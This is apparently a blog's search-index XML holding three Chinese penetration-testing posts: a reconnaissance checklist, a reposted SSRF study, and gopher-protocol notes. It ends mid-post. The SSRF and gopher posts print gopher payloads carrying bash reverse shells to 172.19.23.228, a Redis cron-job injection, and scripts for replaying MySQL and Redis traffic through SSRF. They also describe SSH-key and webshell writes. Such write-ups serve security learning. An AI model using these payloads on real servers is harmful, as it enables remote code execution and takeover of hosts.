<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>信息搜集</title>
      <link href="/186766472.html"/>
      <url>/186766472.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>稍微总结整理了下，当备忘录了，后期可能会继续更新</p><h1 id="信息搜集流程"><a href="#信息搜集流程" class="headerlink" title="信息搜集流程"></a>信息搜集流程</h1><blockquote><p>拿到一个网站首先进行：whois、子域名、备案信息；<br>利用获取到的子域名批量获取服务器信息：真实ip、端口服务、dns信息务；<br>然后是web层方面：网站架构、信息泄露、探测waf、旁站和C端、网络空间<br>整理后查找脆弱点进行渗透</p></blockquote><h1 id="信息搜集方法"><a href="#信息搜集方法" class="headerlink" title="信息搜集方法"></a>信息搜集方法</h1><h2 id="0x01-Whois"><a href="#0x01-Whois" class="headerlink" title="0x01 Whois"></a>0x01 Whois</h2><ol><li><a href="https://whois.chinaz.com/" target="_blank" rel="noopener">https://whois.chinaz.com/</a> //站长</li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> //微步</li><li><a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a> //爱站</li><li>kali 也可通过whois命令进行查询<h2 id="0x02-备案查询"><a href="#0x02-备案查询" class="headerlink" title="0x02 备案查询"></a>0x02 备案查询</h2></li><li><a href="http://www.beian.gov.cn/portal/recordQuery/" target="_blank" rel="noopener">http://www.beian.gov.cn/portal/recordQuery/</a> //公安备案查询</li><li><a href="http://beianbeian.com/" target="_blank" rel="noopener">http://beianbeian.com/</a></li><li><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a> //天眼查</li><li><a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a> //企业信用公示<h2 id="0x03-子域名"><a href="#0x03-子域名" class="headerlink" title="0x03 子域名"></a>0x03 子域名</h2></li><li>layer子域名挖掘机</li><li><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></li><li>subDomainsBrute</li><li>搜索引擎语法(site:xxx.com)<h2 id="0x04-DNS"><a href="#0x04-DNS" class="headerlink" title="0x04 DNS"></a>0x04 DNS</h2></li><li>Kali（host、dig命令）</li><li>windows（nslookup命令）</li><li>在线工具（<a href="http://tool.chinaz.com/dns/" target="_blank" rel="noopener">http://tool.chinaz.com/dns/</a> //站长）<h2 id="0x05-真实IP"><a href="#0x05-真实IP" class="headerlink" title="0x05 真实IP"></a>0x05 真实IP</h2>很多的网站都挂有CDN加速，获取到的IP不一定是真实IP，如果搜索出来的IP直接访问返回错误，一般就不是真实IP</li></ol><blockquote><p>CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。</p></blockquote><p>获取真实IP 思路</p><blockquote><p>1、二级域名法 一般网站不会所有的二级域名放CDN，因此我们可以利用这点来获取网站的真实ip </p><p> 2、<a href="http://ping.chinaz.com/" target="_blank" rel="noopener">多地ping法</a> 由CDN的原理，不同的地方去Ping服务器，如果IP不一样，则目标网站肯定使用了CDN</p><p> 3、nslookup法 找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP </p><p>4、查看邮件法 通过查看邮件原文来确定ip地址，CDN总不会发送邮件吧</p><p>5、RSS订阅法 RSS原理于邮件法差不多</p><p>6、<a href="https://toolbar.netcraft.com/site_report" target="_blank" rel="noopener">查看历史解析记录法</a> 查找域名历史解析记录，域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址</p><p>7、利用网站漏洞（XSS、命令执行、SSRF、php探针、phpinfo页面等） 可以通过一些页面和漏洞获取到服务器ip地址也是可能的。</p></blockquote><h2 id="0x06-敏感目录和敏感信息"><a href="#0x06-敏感目录和敏感信息" class="headerlink" title="0x06 敏感目录和敏感信息"></a>0x06 敏感目录和敏感信息</h2><ol><li>目录工具（御剑、dirsearch，kali的dirb）</li><li>wpscan（kali扫描wordpress漏洞）</li><li>BBscan （批量扫描信息泄露工具）</li><li>GSIL（GitHub敏感信息泄露监控工具）</li><li>搜索引擎语法（<a href="http://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">www.exploit-db.com/google-hacking-database/</a> //Google Hacking Database）</li><li>同时也可以通过其他社交平台，侧面收集目标的敏感信息</li></ol><h2 id="0x07-网站架构（操作系统、CMS、中间件、数据库、编程语言）"><a href="#0x07-网站架构（操作系统、CMS、中间件、数据库、编程语言）" class="headerlink" title="0x07 网站架构（操作系统、CMS、中间件、数据库、编程语言）"></a>0x07 网站架构（操作系统、CMS、中间件、数据库、编程语言）</h2><ol><li>Nmap、masscan</li><li>wappalyzer插件</li><li><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">云悉</a></li><li>CMS查询工具（御剑cms 、大禹cms、kali的whatweb）</li><li><a href="http://tool.chinaz.com/port" target="_blank" rel="noopener">站长端口在线查询</a> //仅限单个端口扫描（不留痕迹）</li></ol><p>PS：netstat -anbo（window查看开放端口及对应进程，a查看所有连接和侦听端口，n以数字方式显示地址和端口号，b显示端口连接的程序，o显示关联id）需要权限</p><h2 id="旁站和C段"><a href="#旁站和C段" class="headerlink" title="旁站和C段"></a>旁站和C段</h2><ol><li>nmap</li><li>北极熊扫描器</li><li><a href="http://stool.chinaz.com/same" target="_blank" rel="noopener">站长</a></li><li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">在线C段旁站查询</a></li></ol><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><ol><li>nmap (–script=http-waf-detect、–script=http-waf-fingerprint)<blockquote><p>http-waf-detect ，它发送很多恶意请求，看有没有被服务端封杀、过滤或检测到的请求。 http-waf-fingerprint 也是这个工作流程，但是这个脚本还会进一步解析响应，根据不同 IDSs 和 WAFs 的模式来对 WAF 进行分类</p></blockquote></li><li>wafw00f</li><li>sqlmap –identify-waf</li><li>手工探测</li></ol><h2 id="网络空间"><a href="#网络空间" class="headerlink" title="网络空间"></a>网络空间</h2><ol><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a></li><li><a href="https://fofa.so/" target="_blank" rel="noopener">FOFA</a></li><li><a href="https://www.zoomeye.org/statistics" target="_blank" rel="noopener">Zoomeye</a></li></ol><h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><h3 id="谷歌基本语法"><a href="#谷歌基本语法" class="headerlink" title="谷歌基本语法"></a>谷歌基本语法</h3><blockquote><p>“” //双引号表示强制搜索<br>-//表示搜索不包含关键词的网页<br>|  //或者的意思<br>site //返回所有于这个域名有关的网页<br>intext //搜索到的网页正文部分包含关键词<br>intitle //搜索到的网页标题包含关键词<br>cache   //搜索关于某些内容的缓存<br>definne //搜索某个词语的定义<br>filetype //搜索指定的文件类型<br>info //查找指定站点的一些基本信息<br>inurl //搜索包含关键词的URL<br>link //可以返回所有和baidu.com做了链接的URL</p></blockquote><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞研究[转载]</title>
      <link href="/2133607805.html"/>
      <url>/2133607805.html</url>
      
        <content type="html"><![CDATA[<h1 id="声明："><a href="#声明：" class="headerlink" title="声明："></a>声明：</h1><p>本文转载自：<img src="https://github.com/xinali/articles/issues/16" alt></p><p>感觉这个师傅的很多细节是自己没有涉及的，转载保存一下。</p><h1 id="SSRF-利用"><a href="#SSRF-利用" class="headerlink" title="SSRF 利用"></a><code>SSRF 利用</code></h1><p>SSRF目前我所见过的主要攻击本地服务器主要有两种方式一个是利用redis，另一种是利用Memcached<br>进行SSRF攻击，利用最多的库就是<code>libcurl</code>，比如php中的<code>curl_exec</code>，<code>curl</code>命令行等，可以先具体看看curl在SSRF中的作用。</p><h2 id="SSRF-客户端主要利用方式"><a href="#SSRF-客户端主要利用方式" class="headerlink" title="SSRF 客户端主要利用方式"></a><code>SSRF 客户端主要利用方式</code></h2><h3 id="curl支持的协议"><a href="#curl支持的协议" class="headerlink" title="curl支持的协议"></a><code>curl支持的协议</code></h3><p>查看<code>curl</code>支持的协议</p><pre><code># curl -VProtocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp </code></pre><p>我们通过使用curl的几个协议可以知道，入侵主机的一些程序信息</p><ol><li>dict</li></ol><pre><code>attacker.com $ curl &#39;dict://victim.com:2323&#39;victim.com   $ nc -lvvp 2323 Listening on [0.0.0.0] (family 0, port 2323)                               Connection from xxx 33442 received!  CLIENT libcurl 7.47.0</code></pre><ol><li>sftp</li></ol><pre><code>attacker.com $ curl &#39;dict://victim.com:2323&#39;evil.com     $ nc -v -l 11111Listening on [0.0.0.0] (family 0, port 11111)Connection from [54.166.236.232] port 11111 [tcp/*] accepted (family 2, sport 35789)CLIENT libcurl 7.40.0QUIT</code></pre><blockquote><p>大部分的libcurl都不支持sftp协议，需要经过编译才能支持，所以一般这种探测都不会成功。不支持可以表现 在两个方面，一种是客户端的curl不支持发送sftp协议的数据，另一方面服务器端没有办法利用ssrf进行sftp的请求或接受该协议数据。</p></blockquote><ol><li>gopher<br>gopher协议最简单的请求： gopher://127.0.0.1:2333/_test<br>gopher可以向任何端口发送任意形式的请求，例如http的post包：</li></ol><pre><code>gopher://test.com/_POST /exp.php HTTP/1.1%0d%0aHost: test.com_ip%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &gt;%2526 /dev/tcp/172.19.23.228/2333 0&gt;%25261null</code></pre><p>比如我们利用gopher发送符合redis协议的数据包，攻击本地的redis，首先产生redis数据协议，可以利用下面的脚本产生需要的redis协议数据，只要每个数据用<code>%0d%0a</code>分割即可</p><pre><code>#!/bin/bash## License: MIT# Author: Michael Weibel#gen_redis_protocol() {    cmd=$1    proto=&quot;&quot;    proto+=&quot;*&quot;    number_of_words=0    byword=&quot;&quot;    for word in $cmd    do        number_of_words=$[number_of_words+1]        byword+=&quot;$&quot;        byword+=${#word}        byword+=&quot;\\r\\n&quot;        byword+=$word        byword+=&quot;\\r\\n&quot;    done    proto+=${number_of_words}    proto+=&quot;\\r\\n&quot;    proto+=${byword}    printf $proto}gen_redis_protocol &quot;SET mykey Hello&quot;</code></pre><p>因为redis是通过<code>\r\n</code>即<code>%0d%0a</code>，来分割每条命令的，所以首先用上面的脚本生成符合redis协议的数据，之后利用<code>%0d%0a</code>合并即可，举个简单的例子</p><pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre><p>实际上任何形式的报文都可以发，在下划线之后的内容既是报文内容，要注意url加密问题。<br>其中sftp和dict主要用于获取服务器端<code>libssh</code>和<code>libcurl</code>的版本信息，因为可以利用这两个软件的信息进行漏洞利用，gopher则可以直接进行攻击。</p><blockquote><p>libssh2 1.4.2 (probably vulnerable to CVE-2015-1782) and libcurl 7.40.0 (probably vulnerable to CVE-2015-3144, CVE-2015-3237)</p></blockquote><h2 id="SSRF-起源-服务器后端语言"><a href="#SSRF-起源-服务器后端语言" class="headerlink" title="SSRF 起源---服务器后端语言"></a><code>SSRF 起源---服务器后端语言</code></h2><h3 id="SSRF-服务器端-php后端"><a href="#SSRF-服务器端-php后端" class="headerlink" title="SSRF 服务器端--php后端"></a><code>SSRF 服务器端--php后端</code></h3><p>如果利用php写的后端，那么php中可以触发ssrf的函数： <code>file_get_contents()</code>, <code>fsockopen()</code>, <code>curl_exec()</code>, <code>fopen()</code></p><ol><li><code>curl_exec()</code>，可以发送get请求和post请求：<br>curl如果前面不输入协议会自动走http协议， 默认情况下，curl不会跟踪302跳转，并且curl不支持php的伪协议，不用考虑文件包含漏洞。</li></ol><pre><code>$ http --follow --all -h http://172.16.1.4/test_curl_exec.php&lt;?php$curl = curl_init();curl_setopt($curl, CURLOPT_URL, &#39;http://172.16.1.4/302.php&#39;);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, 1);curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); # 设置curl跟踪302跳转$response = curl_exec($curl);var_dump($response);curl_close($curl);?&gt;</code></pre><ol><li><code>file_get_contents</code>只能get访问url，但是默认情况下就支持302跳转</li></ol><pre><code>$ http --follow --all -h http://172.16.1.4/test_curl_exec.php&lt;?php$response = file_get_contents(&quot;http://172.16.1.4/302.php&quot;);var_dump($response);?&gt;</code></pre><p>必须输入协议，比如<code>http://</code>，在<code>php5.6</code>和<code>php7.1.7</code>测试下都不支持gopher。</p><blockquote><p>同样该函数也是LFI(本地文件包含)漏洞需要重点关注的函数</p></blockquote><ol><li>fsockopen需要自己写http报文，几乎不会有人用吧。 Fopen用的也很少，但是它是可以请求一个url的，如果php开启了 fopen 的 gopher wrapper，那么fopen就可以直接发送gopher请求。<br>能够运行的原因就是<code>curl</code>扩展支持<code>dict</code>和<code>file</code>协议，可以利用这些协议对主机进行相关的数据请求。普通的标签，比如<code>img</code>，<code>script</code>等基本都不会支持那么多的协议，就本就要想别的办法。</li></ol><h2 id="SSRF-提供某种服务-redis-memcache"><a href="#SSRF-提供某种服务-redis-memcache" class="headerlink" title="SSRF 提供某种服务--redis/memcache"></a><code>SSRF 提供某种服务--redis/memcache</code></h2><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a><code>redis</code></h3><p>redis支持的通信协议格式</p><pre><code>*&lt;参数数量&gt; CR LF$&lt;参数 1 的字节数量&gt; CR LF&lt;参数 1 的数据&gt; CR LF...$&lt;参数 N 的字节数量&gt; CR LF&lt;参数 N 的数据&gt; CR LF</code></pre><p>具体可以打印出来的是这样的</p><pre><code>*3$3SET$5mykey$7myvalue</code></pre><p>每行数据都是利用<code>\r\n</code>(<code>%0d0a</code>)分割的，只要能够发送这样的数据，redis都照常解析</p><ol><li><code>http</code> 协议<br>正常如果使用<code>http</code>协议请求<code>redis</code>，会出现这样的错误</li></ol><pre><code>$ curl &#39;http://212.24.111.64:6379/%0D%0Ainfo&#39;-ERR wrong number of arguments for &#39;get&#39; command-ERR unknown command &#39;User-Agent:&#39;-ERR unknown command &#39;Host:&#39;-ERR unknown command &#39;Accept:&#39;</code></pre><p>出现这样错误是因为<code>http</code>协议的头数据都是通过<code>\r\n</code>来分割的，redis解析这样的数据，所以就出现了上面的错误。如果想要通过<code>http</code>数据利用redis，那么服务器端进行远程(或本地)请求的函数必须存在<code>CRLF</code>这样<code>http</code>头解析漏洞。</p><ol><li>CRLF漏洞<br>如果目标服务器存在CRLF漏洞，对redis使用http请</li></ol><blockquote><p>我根据数据报文格式和redis的通信协议，猜测redis就是解析tcp数据包，以<code>\r\n</code>即<code>%0D%0A</code>为分割线，分割成各个命令，所以如果存在CRLF漏洞，那么可以直接将命令注入报文中，redis解析之后直接执行命令！<br>比如redis支持<code>dict</code>协议</p></blockquote><pre><code>curl &#39;http://xx:6379/info&#39;curl &#39;http://xx:6379/config set dir /var/www/html&#39;</code></pre><p>ssrf在利用的过程中，经常会遇到某个应用”不支持”某种协议的情况，确切来说不是不支持，而是没有办法直接利用，举个例子，redis没有办法直接用<code>http</code>请求进行相关操作，如果直接用的话，会遇到这样的情况</p><h3 id="memcache"><a href="#memcache" class="headerlink" title="memcache"></a><code>memcache</code></h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><code>参考链接</code></h2><p><a href="http://redisdoc.com/topic/protocol.html" target="_blank" rel="noopener">redis通信协议</a><br><a href="http://106.14.61.185/2016/12/07/ssrf/" target="_blank" rel="noopener">ssrf总结</a></p><p>360识图ssrf：<a href="http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0229611" target="_blank" rel="noopener">http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0229611</a><br>远程服务器脚本：</p><pre><code>&lt;?php$ip = $_GET[&#39;ip&#39;];$port = $_GET[&#39;port&#39;];$scheme = $_GET[&#39;s&#39;];$data = $_GET[&#39;data&#39;];header(&quot;Location: $scheme://$ip:$port/$data&quot;);?&gt;</code></pre><p>ssrf=&gt; mysql 导致getshell：<a href="https://paper.seebug.org/510/" target="_blank" rel="noopener">https://paper.seebug.org/510/</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>gopher协议学习</title>
      <link href="/3983147628.html"/>
      <url>/3983147628.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近看ssrf，看gopher协议，属实强大，不愧为万金油，在这里好好总结学习一下。</p><h2 id="0x02-Gopher基本介绍"><a href="#0x02-Gopher基本介绍" class="headerlink" title="0x02 Gopher基本介绍"></a>0x02 Gopher基本介绍</h2><h3 id="2-1-什么是Gopher？"><a href="#2-1-什么是Gopher？" class="headerlink" title="2.1 什么是Gopher？"></a>2.1 什么是Gopher？</h3><p>Gopher是一个互联网上使用的分布型的文件搜集获取网络协议。再WWW未发明之前，是最主要的信息检索工具，但是随着WWW的出现，Gopher因为结构的不灵活等原因，慢慢退出历史舞台。</p><h3 id="2-2-Gopher协议在各个协议中的限制"><a href="#2-2-Gopher协议在各个协议中的限制" class="headerlink" title="2.2 Gopher协议在各个协议中的限制"></a>2.2 Gopher协议在各个协议中的限制</h3><p><img src="https://pic2.zhimg.com/80/v2-ea9bb9538044933ac3c918d5a56f2d69_720w.png" alt></p><blockquote><p>–wite-curlwrappers：运用curl工具打开url流<br>curl使用curl –version查看版本以及支持的协议</p></blockquote><p>windows中的curl貌似已经不支持gopher协议，可能也是版本问题（本地win10测试），所有测试都基于linux</p><h3 id="2-3-Gopher协议格式"><a href="#2-3-Gopher协议格式" class="headerlink" title="2.3 Gopher协议格式"></a>2.3 Gopher协议格式</h3><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code><br>gopher的默认端口是70<br>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码<br>需要注意的是TCP数据流前必须要有个字符，不一定是_任何字符都可，该字符不会被传输，是一种数据连接格式。</p><h2 id="0x03利用Gopher协议发送请求"><a href="#0x03利用Gopher协议发送请求" class="headerlink" title="0x03利用Gopher协议发送请求"></a>0x03利用Gopher协议发送请求</h2><p>gopher协议支持发出GET、POST请求，我们可以通过构造我们想要发送的数据包，在构成符合gopher协议的请求后进行发送，实现我们需要进行的操作。可以看出来哈，十分灵活，可以说是ssrf里最强的协议了。</p><p>需要注意的是：</p><blockquote><p>1、问号（？）需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a<br>3、在HTTP包的最后要加%0d%0a，代表消息结束</p></blockquote><p>附上一份大佬写的编码脚本：</p><pre><code>#!/usr/bin/python# -*- coding:utf8 -*-import getoptimport sysimport redef togopher():    try:        opts,args = getopt.getopt(sys.argv[1:], &quot;hf:s:&quot;, [&quot;help&quot;, &quot;file=&quot;, &quot;stream=&quot;])    except:        print &quot;&quot;&quot;        Usage: python togopher.py -f &lt;filename&gt;               python togopher.py -s &lt;Byte stream&gt;               python togopher.py -h        &quot;&quot;&quot;        sys.exit()    if len(opts) == 0:        print &quot;Usage: python togopher.py -h&quot;    for opt,value in opts:        if opt in (&quot;-h&quot;, &quot;--help&quot;):            print &quot;&quot;&quot;            Usage:             -h     --help     帮助            -f     --file     数据包文件名            -s     --stream   从流量包中得到的字节流            &quot;&quot;&quot;            sys.exit()        if opt in (&quot;-f&quot;, &quot;--file&quot;):            if not value:                print &quot;Usage: python togopher.py -f &lt;filename&gt;&quot;                sys.exit()            words = &quot;&quot;            with open(value, &quot;r&quot;) as f:                for i in f.readlines():                    for j in i:                        if re.findall(r&#39;\n&#39;, j):                            words += &quot;%0d%0a&quot;                        else:                            temp = str(hex(ord(j)))                            if len(temp) == 3:                                words += &quot;%0&quot; + temp[2]                            else:                                words += &quot;%&quot; + temp[2:]            print words        if opt in (&quot;-s&quot;, &quot;--stream&quot;):            if not value:                print &quot;Usage: python togopher.py -s &lt;Bytg stream&gt;&quot;                sys.exit()            a = [value[i:i+2] for i in xrange(0, len(value), 2)]            words = &quot;%&quot; + &quot;%&quot;.join(a)            print wordsif __name__ == &quot;__main__&quot;:    togopher()</code></pre><h2 id="0x04-利用gopher攻击未授权Mysql"><a href="#0x04-利用gopher攻击未授权Mysql" class="headerlink" title="0x04 利用gopher攻击未授权Mysql"></a>0x04 利用gopher攻击未授权Mysql</h2><h3 id="4-1-MySQL连接方式"><a href="#4-1-MySQL连接方式" class="headerlink" title="4.1 MySQL连接方式"></a>4.1 MySQL连接方式</h3><p>MySQL分为服务端和客户端，客户端连接服务器使存在三种方法：</p><ol><li>Unix套接字；</li><li>内存共享/命名管道；</li><li>TCP/IP套接字；</li></ol><ul><li>在linux或者Unix环境下，当我们输入<code>mysql -uroot -proot</code>登录MySQL服务器时就是用的Unix套接字连接；Unix套接字其实不是一个网络协议，只能在客户端和Mysql服务器在同一台电脑上才可以使用。</li><li>在window系统中客户端和Mysql服务器在同一台电脑上，可以使用命名管道和共享内存的方式。</li><li>P/IP套接字是在任何系统下都可以使用的方式，也是使用最多的连接方式，当我们输入<code>mysql –h 127.0.0.1 –u root –proot</code>时就是要TCP/IP套接字。</li></ul><p><strong>抓取的MySQL通信数据包必须使用TCP/IP套接字连接。</strong></p><h3 id="4-2-MySQL认证过程"><a href="#4-2-MySQL认证过程" class="headerlink" title="4.2 MySQL认证过程"></a>4.2 MySQL认证过程</h3><p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。</p><ul><li>当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证</li><li>当无需密码认证时直接发送TCP/IP数据包即可</li></ul><p><strong>所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。</strong></p><p>MySQL客户端与服务器的交互主要分为两个阶段：连接阶段或者叫认证阶段和命令阶段。在连接阶段包括握手包和认证包，这里主要关注认证数据包。</p><p>认证数据包格式如下：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-33b97dd543e0d977.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>以上内容摘抄自smile师傅的文章，非原创<br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a></p><h3 id="4-3-构造攻击数据包"><a href="#4-3-构造攻击数据包" class="headerlink" title="4.3 构造攻击数据包"></a>4.3 构造攻击数据包</h3><p>通过上面MySQL通信协议的分析，现在需要构造一个基于TCP/IP的数据包，包括连接，认证，执行命令，退出等MySQL通信数据。</p><blockquote><p>新建一个只允许本地访问的拥有所有权限的且无密码的用户：<br>CREATE USER ‘test’@’localhost’;<br>GRANT ALL ON <em>.</em> TO ‘test’@’localhost’;</p></blockquote><p>这样我们就有了一个未授权的Mysql数据库，然后开始监听流量<br><code>tcpdump -i lo port 3306 -w mysql.pcapng</code></p><p>在执行我们想要执行的mysql语句；<br>如:</p><pre><code>ues mysql;select * from user;</code></pre><p>然后在wireshark中查看我们抓到包<br>需要注意的是要使用TCP/IP套接字模式连接数据库<br><code>mysql –h 127.0.0.1 –u test</code><br>然后追踪tcp流，从中过滤处传送给3306的转存为原始数据<br><img src="/3983147628/1.png" alt><br>然后转换成gopher格式，附一个网上的脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">def</span> <span class="token function">results</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    a<span class="token operator">=</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">"curl gopher://127.0.0.1:3306/_%"</span><span class="token operator">+</span><span class="token string">"%"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> sys    s<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>results<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/3983147628/2.png" alt><br>然后直接执行，成功获取数据<br><img src="/3983147628/3.png" alt></p><p>这就等于是mysql的RCE，可以执行任何的mysql操作，可以根据权限进行判断</p><ol><li>udf提权实现任意命令执行（需要有插件目录的写入权限）</li><li>通过mysql执行select into outfile，写webshell（绝对路径、对web目录有写权限、且没有配置 –secure-file-priv）<br>secure_file_priv参数若为NULL代表不可导出，若为空则表示可导出⾄任意⽬录下，或者是通过该参数指定mysql的导出⽬录。</li><li>load_file()函数读文件（FILE权限，可读权限）</li><li>……</li></ol><h2 id="0x05-利用gopher攻击未授权Redis"><a href="#0x05-利用gopher攻击未授权Redis" class="headerlink" title="0x05 利用gopher攻击未授权Redis"></a>0x05 利用gopher攻击未授权Redis</h2><p>这个是ssrf最常见的一种了，大致其实与MYSQL是一样的，都是由于未授权导致，可以利用gopher，进行RCE，redis常见的利用方式为下面三种</p><ol><li>ssh_keygen公钥写入，可以说是危害最大的一种攻击方式了</li><li>绝对路径写webshell</li><li>利用contrab计划任务反弹shell</li></ol><h3 id="5-1-Redis数据库简介"><a href="#5-1-Redis数据库简介" class="headerlink" title="5.1 Redis数据库简介"></a>5.1 Redis数据库简介</h3><p>redis是一种key-value键值对的非关系型数据库，默认运行在6379端口，它启动时不会像apache一样，以一种www-data低权限身份运行。而是以运行者的身份，例如用root权限直接运行redis时，redis的权限就是root权限，其次它的默认配置是无需密码的（# requirepass foobared），也就造成了默认的未授权访问，redis还支持本地存储，也就导致了任意文件写入。从而可以写入私钥，利用私钥直接ssh登录服务器。这就是为什么redis是SSRF中最常见的一种方式了。</p><p>另外还需要修改下配置文件（redis.conf），不然默认虽然是无密码，但是会有protected模式，导致无法从外部主机连接，要再bind 127.0.0.1前面加上#号（感觉要是要求是本地，可以不需要这个），并把protected-mode设为no</p><p>常用命令：<br>连接redis</p><blockquote><p>redis-cli -h 192.168.85.132</p></blockquote><p>查看版本信息</p><blockquote><p>192.168.85.132:6379&gt;info</p></blockquote><p>查看键为x的值</p><blockquote><p>192.168.85.132:6379&gt;get x</p></blockquote><p>查看所有键</p><blockquote><p>192.168.85.132:6379&gt;keys *</p></blockquote><p>设置x的值为test</p><blockquote><p>192.168.85.132:6379&gt;set x “test”</p></blockquote><p>删除所有键</p><blockquote><p>192.168.85.132:6379&gt;flushall</p></blockquote><p>设置redis本地存储的文件夹和文件名</p><blockquote><p>192.168.85.132:6379&gt;config set dir /root/.ssh<br>192.168.85.132:6379&gt;config set dbfilename authorized_keys</p></blockquote><h3 id="5-2-Redis协议"><a href="#5-2-Redis协议" class="headerlink" title="5.2 Redis协议"></a>5.2 Redis协议</h3><p>Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。<br>RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。</p><p>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p><p>RESP在Redis中用作请求 - 响应协议的方式如下：</p><ol><li>客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。</li><li>服务器根据命令实现回复一种RESP类型。</li></ol><p>在RESP中，某些数据的类型取决于第一个字节：</p><ul><li>对于<code>Simple 